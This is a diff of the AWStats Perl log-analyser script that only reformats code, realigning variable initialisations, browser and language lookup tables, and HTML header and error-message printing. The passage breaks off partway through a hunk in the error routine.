@@ -14,10 +14,10 @@ require 5.005;
 #use diagnostics;	# Must be used in test mode only. This reduce a lot of process speed
 use strict;
 no strict "refs";
-use Time::Local;	# use Time::Local 'timelocal_nocheck' is faster but not supported by all Time::Local modules
+use Time::Local
+  ; # use Time::Local 'timelocal_nocheck' is faster but not supported by all Time::Local modules
 use Socket;
 use Encode;
-
 
 #------------------------------------------------------------------------------
 # Defines
@@ -52,7 +52,7 @@ $NOTSORTEDRECORDTOLERANCE = 20000
   ; # Lapse of time to accept a record if not in correct order. 20000 = 2 hour (Default = 20000)
 $WIDTHCOLICON = 32;
 $TOOLTIPON    = 0;    # Tooltips plugin loaded
-$NOHTML = 0;		  # Suppress the html headers
+$NOHTML       = 0;    # Suppress the html headers
 
 # ----- Running variables -----
 use vars qw/
@@ -80,7 +80,7 @@ $DIR = $PROG = $Extension = '';
 $Debug          = $ShowSteps            = 0;
 $DebugResetDone = $DNSLookupAlreadyDone = 0;
 $RunAsCli       = $UpdateFor            = $HeaderHTTPSent = $HeaderHTMLSent = 0;
-$LastLine       = $LastLineNumber       = $LastLineOffset = $LastLineChecksum = 0;
+$LastLine = $LastLineNumber = $LastLineOffset = $LastLineChecksum = 0;
 $LastUpdate          = 0;
 $lowerval            = 0;
 $PluginMode          = '';
@@ -94,10 +94,10 @@ $TotalDifferentKeywords = 0;
 $TotalSearchEnginesPages = $TotalSearchEnginesHits = $TotalRefererPages = 0;
 $TotalRefererHits = $TotalDifferentSearchEngines = $TotalDifferentReferer = 0;
 (
-   $FrameName,    $Center,       $FileConfig,        $FileSuffix,
-   $Host,         $YearRequired, $MonthRequired,     $DayRequired,
-   $HourRequired, $QueryString,  $SiteConfig,        $StaticLinks,
-   $PageCode,     $PageDir,      $PerlParsingFormat, $UserAgent
+	$FrameName,    $Center,       $FileConfig,        $FileSuffix,
+	$Host,         $YearRequired, $MonthRequired,     $DayRequired,
+	$HourRequired, $QueryString,  $SiteConfig,        $StaticLinks,
+	$PageCode,     $PageDir,      $PerlParsingFormat, $UserAgent
   )
   = ( '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '' );
 
@@ -151,18 +151,18 @@ $MaxRowsInHTMLOutput    = 1000;
 $MaxLengthOfShownURL    = 64;
 $MaxLengthOfStoredURL = 256;  # Note: Apache LimitRequestLine is default to 8190
 $MaxLengthOfStoredUA  = 256;
-%BarPng = (
-			'vv' => 'vv.png',
-			'vu' => 'vu.png',
-			'hu' => 'hu.png',
-			'vp' => 'vp.png',
-			'hp' => 'hp.png',
-			'he' => 'he.png',
-			'hx' => 'hx.png',
-			'vh' => 'vh.png',
-			'hh' => 'hh.png',
-			'vk' => 'vk.png',
-			'hk' => 'hk.png'
+%BarPng               = (
+	'vv' => 'vv.png',
+	'vu' => 'vu.png',
+	'hu' => 'hu.png',
+	'vp' => 'vp.png',
+	'hp' => 'hp.png',
+	'he' => 'he.png',
+	'hx' => 'hx.png',
+	'vh' => 'vh.png',
+	'hh' => 'hh.png',
+	'vk' => 'vk.png',
+	'hk' => 'hk.png'
 );
 $BuildReportFormat     = 'html';
 $BuildHistoryFormat    = 'text';
@@ -182,51 +182,51 @@ use vars qw/
   $DecodeUA
   /;
 (
-   $DebugMessages,
-   $AllowToUpdateStatsFromBrowser,
-   $EnableLockForUpdate,
-   $DNSLookup,
-   $AllowAccessFromWebToAuthenticatedUsersOnly,
-   $BarHeight,
-   $BarWidth,
-   $CreateDirDataIfNotExists,
-   $KeepBackupOfHistoricFiles,
-   $NbOfLinesParsed,
-   $NbOfLinesDropped,
-   $NbOfLinesCorrupted,
-   $NbOfOldLines,
-   $NbOfNewLines,
-   $NbOfLinesShowsteps,
-   $NewLinePhase,
-   $NbOfLinesForCorruptedLog,
-   $PurgeLogFile,
-   $ArchiveLogRecords,
-   $ShowDropped,
-   $ShowCorrupted,
-   $ShowUnknownOrigin,
-   $ShowDirectOrigin,
-   $ShowLinksToWhoIs,
-   $ShowAuthenticatedUsers,
-   $ShowFileSizesStats,
-   $ShowScreenSizeStats,
-   $ShowSMTPErrorsStats,
-   $ShowEMailSenders,
-   $ShowEMailReceivers,
-   $ShowWormsStats,
-   $ShowClusterStats,
-   $IncludeInternalLinksInOriginSection,
-   $AuthenticatedUsersNotCaseSensitive,
-   $Expires,
-   $UpdateStats,
-   $MigrateStats,
-   $URLNotCaseSensitive,
-   $URLWithQuery,
-   $URLReferrerWithQuery,
-   $DecodeUA
+	$DebugMessages,
+	$AllowToUpdateStatsFromBrowser,
+	$EnableLockForUpdate,
+	$DNSLookup,
+	$AllowAccessFromWebToAuthenticatedUsersOnly,
+	$BarHeight,
+	$BarWidth,
+	$CreateDirDataIfNotExists,
+	$KeepBackupOfHistoricFiles,
+	$NbOfLinesParsed,
+	$NbOfLinesDropped,
+	$NbOfLinesCorrupted,
+	$NbOfOldLines,
+	$NbOfNewLines,
+	$NbOfLinesShowsteps,
+	$NewLinePhase,
+	$NbOfLinesForCorruptedLog,
+	$PurgeLogFile,
+	$ArchiveLogRecords,
+	$ShowDropped,
+	$ShowCorrupted,
+	$ShowUnknownOrigin,
+	$ShowDirectOrigin,
+	$ShowLinksToWhoIs,
+	$ShowAuthenticatedUsers,
+	$ShowFileSizesStats,
+	$ShowScreenSizeStats,
+	$ShowSMTPErrorsStats,
+	$ShowEMailSenders,
+	$ShowEMailReceivers,
+	$ShowWormsStats,
+	$ShowClusterStats,
+	$IncludeInternalLinksInOriginSection,
+	$AuthenticatedUsersNotCaseSensitive,
+	$Expires,
+	$UpdateStats,
+	$MigrateStats,
+	$URLNotCaseSensitive,
+	$URLWithQuery,
+	$URLReferrerWithQuery,
+	$DecodeUA
   )
   = (
-	  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
-	  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
+	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   );
 use vars qw/
   $DetailedReportsOnNewWindows
@@ -240,40 +240,40 @@ use vars qw/
   $AddDataArrayMonthStats $AddDataArrayShowDaysOfMonthStats $AddDataArrayShowDaysOfWeekStats $AddDataArrayShowHoursStats
   /;
 (
-   $DetailedReportsOnNewWindows,
-   $FirstDayOfWeek,
-   $KeyWordsNotSensitive,
-   $SaveDatabaseFilesWithPermissionsForEveryone,
-   $WarningMessages,
-   $ShowLinksOnUrl,
-   $UseFramesWhenCGI,
-   $ShowMenu,
-   $ShowSummary,
-   $ShowMonthStats,
-   $ShowDaysOfMonthStats,
-   $ShowDaysOfWeekStats,
-   $ShowHoursStats,
-   $ShowDomainsStats,
-   $ShowHostsStats,
-   $ShowRobotsStats,
-   $ShowSessionsStats,
-   $ShowPagesStats,
-   $ShowFileTypesStats,
-   $ShowOSStats,
-   $ShowBrowsersStats,
-   $ShowOriginStats,
-   $ShowKeyphrasesStats,
-   $ShowKeywordsStats,
-   $ShowMiscStats,
-   $ShowHTTPErrorsStats,
-   $AddDataArrayMonthStats,
-   $AddDataArrayShowDaysOfMonthStats,
-   $AddDataArrayShowDaysOfWeekStats,
-   $AddDataArrayShowHoursStats
+	$DetailedReportsOnNewWindows,
+	$FirstDayOfWeek,
+	$KeyWordsNotSensitive,
+	$SaveDatabaseFilesWithPermissionsForEveryone,
+	$WarningMessages,
+	$ShowLinksOnUrl,
+	$UseFramesWhenCGI,
+	$ShowMenu,
+	$ShowSummary,
+	$ShowMonthStats,
+	$ShowDaysOfMonthStats,
+	$ShowDaysOfWeekStats,
+	$ShowHoursStats,
+	$ShowDomainsStats,
+	$ShowHostsStats,
+	$ShowRobotsStats,
+	$ShowSessionsStats,
+	$ShowPagesStats,
+	$ShowFileTypesStats,
+	$ShowOSStats,
+	$ShowBrowsersStats,
+	$ShowOriginStats,
+	$ShowKeyphrasesStats,
+	$ShowKeywordsStats,
+	$ShowMiscStats,
+	$ShowHTTPErrorsStats,
+	$AddDataArrayMonthStats,
+	$AddDataArrayShowDaysOfMonthStats,
+	$AddDataArrayShowDaysOfWeekStats,
+	$AddDataArrayShowHoursStats
   )
   = (
-	  1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
-	  1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1
+	1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
+	1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1
   );
 use vars qw/
   $AllowFullYearView
@@ -281,11 +281,11 @@ use vars qw/
   $LevelForFileTypesDetection $LevelForSearchEnginesDetection $LevelForKeywordsDetection
   /;
 (
-   $AllowFullYearView,          $LevelForRobotsDetection,
-   $LevelForWormsDetection,     $LevelForBrowsersDetection,
-   $LevelForOSDetection,        $LevelForRefererAnalyze,
-   $LevelForFileTypesDetection, $LevelForSearchEnginesDetection,
-   $LevelForKeywordsDetection
+	$AllowFullYearView,          $LevelForRobotsDetection,
+	$LevelForWormsDetection,     $LevelForBrowsersDetection,
+	$LevelForOSDetection,        $LevelForRefererAnalyze,
+	$LevelForFileTypesDetection, $LevelForSearchEnginesDetection,
+	$LevelForKeywordsDetection
   )
   = ( 2, 2, 0, 2, 2, 2, 2, 2, 2 );
 use vars qw/
@@ -295,24 +295,24 @@ use vars qw/
   $UseHTTPSLinkForUrl $URLQuerySeparators $URLWithAnchor $ErrorMessages $ShowFlagLinks
   /;
 (
-   $DirLock,                                  $DirCgi,
-   $DirConfig,                                $DirData,
-   $DirIcons,                                 $DirLang,
-   $AWScript,                                 $ArchiveFileName,
-   $AllowAccessFromWebToFollowingIPAddresses, $HTMLHeadSection,
-   $HTMLEndSection,                           $LinksToWhoIs,
-   $LinksToIPWhoIs,                           $LogFile,
-   $LogType,                                  $LogFormat,
-   $LogSeparator,                             $Logo,
-   $LogoLink,                                 $StyleSheet,
-   $WrapperScript,                            $SiteDomain,
-   $UseHTTPSLinkForUrl,                       $URLQuerySeparators,
-   $URLWithAnchor,                            $ErrorMessages,
-   $ShowFlagLinks
+	$DirLock,                                  $DirCgi,
+	$DirConfig,                                $DirData,
+	$DirIcons,                                 $DirLang,
+	$AWScript,                                 $ArchiveFileName,
+	$AllowAccessFromWebToFollowingIPAddresses, $HTMLHeadSection,
+	$HTMLEndSection,                           $LinksToWhoIs,
+	$LinksToIPWhoIs,                           $LogFile,
+	$LogType,                                  $LogFormat,
+	$LogSeparator,                             $Logo,
+	$LogoLink,                                 $StyleSheet,
+	$WrapperScript,                            $SiteDomain,
+	$UseHTTPSLinkForUrl,                       $URLQuerySeparators,
+	$URLWithAnchor,                            $ErrorMessages,
+	$ShowFlagLinks
   )
   = (
-	  '', '', '', '', '', '', '', '', '', '', '', '', '', '',
-	  '', '', '', '', '', '', '', '', '', '', '', '', ''
+	'', '', '', '', '', '', '', '', '', '', '', '', '', '',
+	'', '', '', '', '', '', '', '', '', '', '', '', ''
   );
 use vars qw/
   $color_Background $color_TableBG $color_TableBGRowTitle
@@ -321,18 +321,18 @@ use vars qw/
   $color_h $color_k $color_p $color_e $color_x $color_s $color_u $color_v
   /;
 (
-   $color_Background,   $color_TableBG,     $color_TableBGRowTitle,
-   $color_TableBGTitle, $color_TableBorder, $color_TableRowTitle,
-   $color_TableTitle,   $color_text,        $color_textpercent,
-   $color_titletext,    $color_weekend,     $color_link,
-   $color_hover,        $color_other,       $color_h,
-   $color_k,            $color_p,           $color_e,
-   $color_x,            $color_s,           $color_u,
-   $color_v
+	$color_Background,   $color_TableBG,     $color_TableBGRowTitle,
+	$color_TableBGTitle, $color_TableBorder, $color_TableRowTitle,
+	$color_TableTitle,   $color_text,        $color_textpercent,
+	$color_titletext,    $color_weekend,     $color_link,
+	$color_hover,        $color_other,       $color_h,
+	$color_k,            $color_p,           $color_e,
+	$color_x,            $color_s,           $color_u,
+	$color_v
   )
   = (
-	  '', '', '', '', '', '', '', '', '', '', '', '',
-	  '', '', '', '', '', '', '', '', '', ''
+	'', '', '', '', '', '', '', '', '', '', '', '',
+	'', '', '', '', '', '', '', '', '', ''
   );
 
 # ---------- Init arrays --------
@@ -367,156 +367,165 @@ use vars qw/
   @PluginsToLoad
   /;
 @MiscListOrder = (
-				   'AddToFavourites',  'JavascriptDisabled',
-				   'JavaEnabled',      'DirectorSupport',
-				   'FlashSupport',     'RealPlayerSupport',
-				   'QuickTimeSupport', 'WindowsMediaPlayerSupport',
-				   'PDFSupport'
+	'AddToFavourites',  'JavascriptDisabled',
+	'JavaEnabled',      'DirectorSupport',
+	'FlashSupport',     'RealPlayerSupport',
+	'QuickTimeSupport', 'WindowsMediaPlayerSupport',
+	'PDFSupport'
 );
 %MiscListCalc = (
-				  'TotalMisc'                 => '',
-				  'AddToFavourites'           => 'u',
-				  'JavascriptDisabled'        => 'hm',
-				  'JavaEnabled'               => 'hm',
-				  'DirectorSupport'           => 'hm',
-				  'FlashSupport'              => 'hm',
-				  'RealPlayerSupport'         => 'hm',
-				  'QuickTimeSupport'          => 'hm',
-				  'WindowsMediaPlayerSupport' => 'hm',
-				  'PDFSupport'                => 'hm'
+	'TotalMisc'                 => '',
+	'AddToFavourites'           => 'u',
+	'JavascriptDisabled'        => 'hm',
+	'JavaEnabled'               => 'hm',
+	'DirectorSupport'           => 'hm',
+	'FlashSupport'              => 'hm',
+	'RealPlayerSupport'         => 'hm',
+	'QuickTimeSupport'          => 'hm',
+	'WindowsMediaPlayerSupport' => 'hm',
+	'PDFSupport'                => 'hm'
 );
 %OSFamily = (
-			  'win'   => 'Windows',
-			  'mac'   => 'Macintosh',
-			  'linux' => 'Linux',
-			  'bsd'   => 'BSD'
+	'win'   => 'Windows',
+	'mac'   => 'Macintosh',
+	'linux' => 'Linux',
+	'bsd'   => 'BSD'
 );
-%BrowsersFamily=('msie'=>1,'firefox'=>2,'netscape'=>3,'svn'=>4,'opera'=>5,'safari'=>6,'chrome'=>7,'konqueror'=>8);
+%BrowsersFamily = (
+	'msie'      => 1,
+	'firefox'   => 2,
+	'netscape'  => 3,
+	'svn'       => 4,
+	'opera'     => 5,
+	'safari'    => 6,
+	'chrome'    => 7,
+	'konqueror' => 8
+);
 @SessionsRange =
   ( '0s-30s', '30s-2mn', '2mn-5mn', '5mn-15mn', '15mn-30mn', '30mn-1h', '1h+' );
 %SessionsAverage = (
-					 '0s-30s',   15,  '30s-2mn',   75,   '2mn-5mn', 210,
-					 '5mn-15mn', 600, '15mn-30mn', 1350, '30mn-1h', 2700,
-					 '1h+',      3600
+	'0s-30s',   15,  '30s-2mn',   75,   '2mn-5mn', 210,
+	'5mn-15mn', 600, '15mn-30mn', 1350, '30mn-1h', 2700,
+	'1h+',      3600
 );
 
 # HTTP-Accept or Lang parameter => AWStats code to use for lang
 # ISO-639-1 or 2 or other       => awstats-xx.txt where xx is ISO-639-1
 %LangBrowserToLangAwstats = (
-							  'sq'    => 'al',
-							  'ar'    => 'ar',
-							  'ba'    => 'ba',
-							  'bg'    => 'bg',
-							  'zh-tw' => 'tw',
-							  'zh'    => 'cn',
-							  'cs'    => 'cz',
-							  'de'    => 'de',
-							  'da'    => 'dk',
-							  'en'    => 'en',
-							  'et'    => 'et',
-							  'fi'    => 'fi',
-							  'fr'    => 'fr',
-							  'gl'    => 'gl',
-							  'es'    => 'es',
-							  'eu'    => 'eu',
-							  'ca'    => 'ca',
-							  'el'    => 'gr',
-							  'hu'    => 'hu',
-							  'is'    => 'is',
-							  'in'    => 'id',
-							  'it'    => 'it',
-							  'ja'    => 'jp',
-							  'kr'    => 'ko',
-							  'lv'    => 'lv',
-							  'nl'    => 'nl',
-							  'no'    => 'nb',
-							  'nb'    => 'nb',
-							  'nn'    => 'nn',
-							  'pl'    => 'pl',
-							  'pt'    => 'pt',
-							  'pt-br' => 'br',
-							  'ro'    => 'ro',
-							  'ru'    => 'ru',
-							  'sr'    => 'sr',
-							  'sk'    => 'sk',
-							  'sv'    => 'se',
-							  'th'    => 'th',
-							  'tr'    => 'tr',
-							  'uk'    => 'ua',
-							  'cy'    => 'cy',
-							  'wlk'   => 'cy'
+	'sq'    => 'al',
+	'ar'    => 'ar',
+	'ba'    => 'ba',
+	'bg'    => 'bg',
+	'zh-tw' => 'tw',
+	'zh'    => 'cn',
+	'cs'    => 'cz',
+	'de'    => 'de',
+	'da'    => 'dk',
+	'en'    => 'en',
+	'et'    => 'et',
+	'fi'    => 'fi',
+	'fr'    => 'fr',
+	'gl'    => 'gl',
+	'es'    => 'es',
+	'eu'    => 'eu',
+	'ca'    => 'ca',
+	'el'    => 'gr',
+	'hu'    => 'hu',
+	'is'    => 'is',
+	'in'    => 'id',
+	'it'    => 'it',
+	'ja'    => 'jp',
+	'kr'    => 'ko',
+	'lv'    => 'lv',
+	'nl'    => 'nl',
+	'no'    => 'nb',
+	'nb'    => 'nb',
+	'nn'    => 'nn',
+	'pl'    => 'pl',
+	'pt'    => 'pt',
+	'pt-br' => 'br',
+	'ro'    => 'ro',
+	'ru'    => 'ru',
+	'sr'    => 'sr',
+	'sk'    => 'sk',
+	'sv'    => 'se',
+	'th'    => 'th',
+	'tr'    => 'tr',
+	'uk'    => 'ua',
+	'cy'    => 'cy',
+	'wlk'   => 'cy'
 );
 %LangAWStatsToFlagAwstats =
   (  # If flag (country ISO-3166 two letters) is not same than AWStats Lang code
-							  'ca' => 'es_cat',
-							  'et' => 'ee',
-							  'eu' => 'es_eu',
-							  'cy' => 'wlk',
-							  'gl' => 'glg',
-							  'he' => 'il',
-							  'ko' => 'kr',
-							  'ar' => 'sa',
-							  'sr' => 'cs'
+	'ca' => 'es_cat',
+	'et' => 'ee',
+	'eu' => 'es_eu',
+	'cy' => 'wlk',
+	'gl' => 'glg',
+	'he' => 'il',
+	'ko' => 'kr',
+	'ar' => 'sa',
+	'sr' => 'cs'
   );
-%SafariBuildToVersion=(
-'85'=>'1.0',
-'85.5'=>'1.0',
-'85.7'=>'1.0.2',
-'85.8'=>'1.0.3',
-'85.8.1'=>'1.0.3',
-'100'=>'1.1',
-'100.1'=>'1.1.1',
-'125.7'=>'1.2.2',
-'125.8'=>'1.2.2',
-'125.9'=>'1.2.3',
-'125.11'=>'1.2.4',
-'125.12'=>'1.2.4',
-'312'=>'1.3',
-'312.3'=>'1.3.1',
-'312.3.1'=>'1.3.1',
-'312.5'=>'1.3.2',
-'312.6'=>'1.3.2',
-'412'=>'2.0',
-'412.2'=>'2.0',
-'412.2.2'=>'2.0',
-'412.5'=>'2.0.1',
-'413'=>'2.0.1',
-'416.12'=>'2.0.2',
-'416.13'=>'2.0.2',
-'417.8'=>'2.0.3',
-'417.9.2'=>'2.0.3',
-'417.9.3'=>'2.0.3',
-'419.3'=>'2.0.4',
-'522.11.3'=>'3.0',
-'522.12'=>'3.0.2',
-'523.10'=>'3.0.4',
-'523.12'=>'3.0.4',
-'525.13'=>'3.1',
-'525.17'=>'3.1.1',
-'525.20'=>'3.1.1',
-'525.20.1'=>'3.1.2',
-'525.21'=>'3.1.2',
-'525.22'=>'3.1.2',
-'525.26'=>'3.2',
-'525.26.13'=>'3.2',
-'525.27'=>'3.2.1',
-'525.27.1'=>'3.2.1',
-'526.11.2'=>'4.0',
-'528.1'=>'4.0',
-'528.16'=>'4.0'
-);  
+%SafariBuildToVersion = (
+	'85'        => '1.0',
+	'85.5'      => '1.0',
+	'85.7'      => '1.0.2',
+	'85.8'      => '1.0.3',
+	'85.8.1'    => '1.0.3',
+	'100'       => '1.1',
+	'100.1'     => '1.1.1',
+	'125.7'     => '1.2.2',
+	'125.8'     => '1.2.2',
+	'125.9'     => '1.2.3',
+	'125.11'    => '1.2.4',
+	'125.12'    => '1.2.4',
+	'312'       => '1.3',
+	'312.3'     => '1.3.1',
+	'312.3.1'   => '1.3.1',
+	'312.5'     => '1.3.2',
+	'312.6'     => '1.3.2',
+	'412'       => '2.0',
+	'412.2'     => '2.0',
+	'412.2.2'   => '2.0',
+	'412.5'     => '2.0.1',
+	'413'       => '2.0.1',
+	'416.12'    => '2.0.2',
+	'416.13'    => '2.0.2',
+	'417.8'     => '2.0.3',
+	'417.9.2'   => '2.0.3',
+	'417.9.3'   => '2.0.3',
+	'419.3'     => '2.0.4',
+	'522.11.3'  => '3.0',
+	'522.12'    => '3.0.2',
+	'523.10'    => '3.0.4',
+	'523.12'    => '3.0.4',
+	'525.13'    => '3.1',
+	'525.17'    => '3.1.1',
+	'525.20'    => '3.1.1',
+	'525.20.1'  => '3.1.2',
+	'525.21'    => '3.1.2',
+	'525.22'    => '3.1.2',
+	'525.26'    => '3.2',
+	'525.26.13' => '3.2',
+	'525.27'    => '3.2.1',
+	'525.27.1'  => '3.2.1',
+	'526.11.2'  => '4.0',
+	'528.1'     => '4.0',
+	'528.16'    => '4.0'
+);
 @HostAliases = @AllowAccessFromWebToFollowingAuthenticatedUsers = ();
 @DefaultFile = @SkipDNSLookupFor = ();
 @SkipHosts = @SkipUserAgents = @NotPageFiles = @SkipFiles = @SkipReferrers = ();
 @OnlyHosts = @OnlyUserAgents = @OnlyFiles = @OnlyUsers = ();
-@URLWithQueryWithOnly = @URLWithQueryWithout = ();
-@ExtraName = @ExtraCondition = @ExtraStatTypes = ();
-@MaxNbOfExtra = @MinHitExtra = ();
-@ExtraFirstColumnTitle = @ExtraFirstColumnValues = ();
+@URLWithQueryWithOnly     = @URLWithQueryWithout    = ();
+@ExtraName                = @ExtraCondition         = @ExtraStatTypes = ();
+@MaxNbOfExtra             = @MinHitExtra            = ();
+@ExtraFirstColumnTitle    = @ExtraFirstColumnValues = ();
 @ExtraFirstColumnFunction = @ExtraFirstColumnFormat = ();
-@ExtraCodeFilter            = @ExtraConditionType = @ExtraConditionTypeVal = ();
+@ExtraCodeFilter = @ExtraConditionType = @ExtraConditionTypeVal = ();
 @ExtraFirstColumnValuesType = @ExtraFirstColumnValuesTypeVal = ();
-@ExtraAddAverageRow         = @ExtraAddSumRow = ();
+@ExtraAddAverageRow         = @ExtraAddSumRow                = ();
 @PluginsToLoad              = ();
 
 # ---------- Init hash arrays --------
@@ -747,12 +756,12 @@ use vars qw/ @Message /;
 	'First',
 	'Last',
 	'Exclude filter',
-	'Codes shown here gave hits or traffic "not viewed" by visitors, so they are not included in other charts.',
+'Codes shown here gave hits or traffic "not viewed" by visitors, so they are not included in other charts.',
 	'Cluster',
-	'Robots shown here gave hits or traffic "not viewed" by visitors, so they are not included in other charts.',
+'Robots shown here gave hits or traffic "not viewed" by visitors, so they are not included in other charts.',
 	'Numbers after + are successful hits on "robots.txt" files',
-	'Worms shown here gave hits or traffic "not viewed" by visitors, so thay are not included in other charts.',
-	'Not viewed traffic includes traffic generated by robots, worms, or replies with special HTTP status codes.',
+'Worms shown here gave hits or traffic "not viewed" by visitors, so thay are not included in other charts.',
+'Not viewed traffic includes traffic generated by robots, worms, or replies with special HTTP status codes.',
 	'Traffic viewed',
 	'Traffic not viewed',
 	'Monthly history',
@@ -769,7 +778,7 @@ use vars qw/ @Message /;
 	'Opera versions',
 	'Safari versions',
 	'Chrome versions',
-	'Konqueror versions'	
+	'Konqueror versions'
 );
 
 #------------------------------------------------------------------------------
@@ -798,12 +807,13 @@ sub http_head {
 		my $newpagecode = $PageCode ? $PageCode : "utf-8";
 		if ( $BuildReportFormat eq 'xhtml' || $BuildReportFormat eq 'xml' ) {
 			print( $ENV{'HTTP_USER_AGENT'} =~ /MSIE|Googlebot/i
-				   ? "Content-type:text/html; charset=$newpagecode\n"
-				   : "Content-type: text/xml; charset=$newpagecode\n" );
+				? "Content-type:text/html; charset=$newpagecode\n"
+				: "Content-type: text/xml; charset=$newpagecode\n"
+			);
 		}
 		else { print "Content-type: text/html; charset=$newpagecode\n"; }
 
-		# Expires must be GMT ANSI asctime and must be after Content-type to avoid pb with some servers (SAMBAR)
+# Expires must be GMT ANSI asctime and must be after Content-type to avoid pb with some servers (SAMBAR)
 		if ( $Expires =~ /^\d+$/ ) {
 			print "Cache-Control: public\n";
 			print "Last-Modified: " . gmtime($starttime) . "\n";
@@ -824,8 +834,7 @@ sub http_head {
 sub html_head {
 	my $dir = $PageDir ? 'right' : 'left';
 	if ($NOHTML) { return; }
-	if ( scalar keys %HTMLOutput || $PluginMode ) 
-	{
+	if ( scalar keys %HTMLOutput || $PluginMode ) {
 		my $periodtitle = " ($YearRequired";
 		$periodtitle .= ( $MonthRequired ne 'all' ? "-$MonthRequired" : "" );
 		$periodtitle .= ( $DayRequired   ne ''    ? "-$DayRequired"   : "" );
@@ -893,7 +902,8 @@ sub html_head {
 				  . "\" />\n"
 				: "<meta http-equiv=\"content-type\" content=\"text/xml; charset="
 				  . ( $PageCode ? $PageCode : "iso-8859-1" )
-				  . "\"$endtag\n" );
+				  . "\"$endtag\n"
+			);
 		}
 		else {
 			print
@@ -932,8 +942,9 @@ sub html_head {
 			if ( $BuildReportFormat eq 'xhtml' || $BuildReportFormat eq 'xml' )
 			{
 				print( $ENV{'HTTP_USER_AGENT'} =~ /Firebird/i
-					   ? "<!--\n"
-					   : "<![CDATA[\n" );
+					? "<!--\n"
+					: "<![CDATA[\n"
+				);
 			}
 			else { print "<!--\n"; }
 
@@ -992,8 +1003,9 @@ EOF
 			if ( $BuildReportFormat eq 'xhtml' || $BuildReportFormat eq 'xml' )
 			{
 				print( $ENV{'HTTP_USER_AGENT'} =~ /Firebird/i
-					   ? "//-->\n"
-					   : "]]>\n" );
+					? "//-->\n"
+					: "]]>\n"
+				);
 			}
 			else { print "//-->\n"; }
 			print "</style>\n";
@@ -1077,12 +1089,12 @@ sub tab_head {
 	my $tooltipnb = shift;
 	my $width     = shift || 70;
 	my $class     = shift;
-	
+
 	# Call to plugins' function TabHeadHTML
-	my $extra_head_html='';
-	foreach my $pluginname (keys %{$PluginsLoaded{'TabHeadHTML'}})  {
-		my $function="TabHeadHTML_$pluginname";
-		$extra_head_html .=&$function($title);
+	my $extra_head_html = '';
+	foreach my $pluginname ( keys %{ $PluginsLoaded{'TabHeadHTML'} } ) {
+		my $function = "TabHeadHTML_$pluginname";
+		$extra_head_html .= &$function($title);
 	}
 
 	if ( $width == 70 && $QueryString =~ /buildpdf/i ) {
@@ -1095,10 +1107,14 @@ sub tab_head {
 	}
 
 	if ($tooltipnb) {
-		print "<tr><td class=\"aws_title\" width=\"$width%\"".Tooltip($tooltipnb,$tooltipnb).">$title ".$extra_head_html."</td>";
+		print "<tr><td class=\"aws_title\" width=\"$width%\""
+		  . Tooltip( $tooltipnb, $tooltipnb )
+		  . ">$title "
+		  . $extra_head_html . "</td>";
 	}
 	else {
-		print "<tr><td class=\"aws_title\" width=\"$width%\">$title ".$extra_head_html."</td>";
+		print "<tr><td class=\"aws_title\" width=\"$width%\">$title "
+		  . $extra_head_html . "</td>";
 	}
 	print "<td class=\"aws_blank\">&nbsp;</td></tr>\n";
 	print "<tr><td colspan=\"2\">\n";
@@ -1195,9 +1211,10 @@ sub error {
 				print
 "111.22.33.44 - - [10/Jan/2001:02:14:14 +0200] \"GET / HTTP/1.1\" 200 1234 \"http://www.fromserver.com/from.htm\" \"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\"\n";
 				print(
-					   scalar keys %HTMLOutput
-					   ? "</i>$tagunfont${tagbr}${tagbr}\n"
-					   : "" );
+					scalar keys %HTMLOutput
+					? "</i>$tagunfont${tagbr}${tagbr}\n"
+					: ""
+				);
 			}
 			if ( $LogFormat == 2 ) {
 				print
@@ -1206,9 +1223,10 @@ sub error {
 				print
 "date time c-ip c-username cs-method cs-uri-sterm sc-status sc-bytes cs-version cs(User-Agent) cs(Referer)\n";
 				print(
-					   scalar keys %HTMLOutput
-					   ? "</i>$tagunfont${tagbr}${tagbr}\n"
-					   : "" );
+					scalar keys %HTMLOutput
+					? "</i>$tagunfont${tagbr}${tagbr}\n"
+					: ""
+				);
 			}
 			if ( $LogFormat == 3 ) {
 				print
@@ -1221,9 +1239,10 @@ sub error {
 				print
 "111.22.33.44 - - [10/Jan/2001:02:14:14 +0200] \"GET / HTTP/1.1\" 200 1234\n";
 				print(
-					   scalar keys %HTMLOutput
-					   ? "</i>$tagunfont${tagbr}${tagbr}\n"
-					   : "" );
+					scalar keys %HTMLOutput
+					? "</i>$tagunfont${tagbr}${tagbr}\n"
+					: ""
+				);
 			}
 			if ( $LogFormat == 6 ) {
 				print
@@ -1232,27 +1251,30 @@ sub error {
 				print
 "111.22.33.44 - Firstname Middlename Lastname [10/Jan/2001:02:14:14 +0200] \"GET / HTTP/1.1\" 200 1234 \"http://www.fromserver.com/from.htm\" \"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\"\n";
 				print(
-					   scalar keys %HTMLOutput
-					   ? "</i></span>${tagbr}${tagbr}\n"
-					   : "" );
+					scalar keys %HTMLOutput
+					? "</i></span>${tagbr}${tagbr}\n"
+					: ""
+				);
 			}
 			if ( $LogFormat !~ /^[1-6]$/ ) {
 				print "the following personalized log format:${tagbr}\n";
 				print( scalar keys %HTMLOutput ? "$tagfontgrey<i>" : "" );
 				print "$LogFormat\n";
 				print(
-					   scalar keys %HTMLOutput
-					   ? "</i>$tagunfont${tagbr}${tagbr}\n"
-					   : "" );
+					scalar keys %HTMLOutput
+					? "</i>$tagunfont${tagbr}${tagbr}\n"
+					: ""
+				);
 			}
 			print
 "And this is an example of records AWStats found in your log file (the record number $NbOfLinesForCorruptedLog in your log):\n";
 			print( scalar keys %HTMLOutput ? "<br />$tagfontgrey<i>" : "" );
 			print "$secondmessage";
 			print(
